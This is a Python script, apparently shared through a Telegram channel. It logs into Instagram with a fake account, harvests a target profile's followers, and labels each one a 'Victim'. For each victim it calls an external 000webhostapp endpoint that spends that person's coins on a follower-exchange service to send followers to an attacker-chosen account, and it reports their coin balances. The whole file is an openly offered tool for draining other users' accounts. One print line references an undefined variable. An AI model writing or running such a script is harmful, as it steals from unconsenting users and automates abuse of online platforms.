import instaloader,os,requests,time
import webbrowser
os.system("clear")
R = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
P = '\u001b[35m'
Y = '\033[1;33m'
W = "\033[0m"
logo=(f"""━━━━━━━━━━━━━
                     _            
  ___ ___  _ __   __| | ___  _ __ 
 / __/ _ \| '_ \ / _` |/ _ \| '__|
| (_| (_) | | | | (_| | (_) | |   
 \___\___/|_| |_|\__,_|\___/|_|   
                                  

━━━━━━━━━━━━━ >> 
@tlrrz
@SlomTube""")
print(logo)

webbrowser.open('https://t.me/SlomTube')

USER = input(G+"Enter UserName Fake  : ")
PASSWORD = input(R+"Enter PassWord Fake : ")
L = instaloader.Instaloader()
L.login(USER, PASSWORD)
username1 = input(B+"Enter Targted UserName  : ")
sendtoo = input(R+"Enter ID For Send Followers : ")
profile = instaloader.Profile.from_username(L.context, username1)
for follow in profile.get_followers():
                profile = str(instaloader.Profile.from_username(L.context,follow.username))
                idd=str(profile.split(')>')[0])
                userid=idd.split(' (')[1]
                
                print(R+"ID Victim Is "+userid)
                url=f"https://unfaltering-session.000webhostapp.com/order-placer.php?oid={userid}&uid={sendtoo}&submit=submit"
                url1=f'https://unfaltering-session.000webhostapp.com/coin-checker.php?oid={userid}&submit=submit'
                
                condor=str(requests.get(url).text)
                
                smahi=str(requests.get(url1).text)
                if '"message":"Something went wrong, Please try again."' in condor:
                	print(R+"[❌] User Not On InstaUp")
                if '"status":"Error"' in condor:
                	print(R+"[❌] User Blocked Or Less Coins")
                if 'coins":"' in smahi:
                	coin=str(smahi.split('coins":"')[1])
                	coins=str(coin.split('"')[0])
                	print(R+f'Coins is ==> {coins}')
                if '"status":"Successful"' in condor:
                	print(G+f'[✅]Successful Send 100 Followers To ==> {sendtoo} ')
                if 'coins":"' in condor:
                	coin=str(condor.split('coins":"')[1])
                	coins=str(coin.split('"')[0])
                	print(G+f'Coins Is ==> {Coins}')
                	
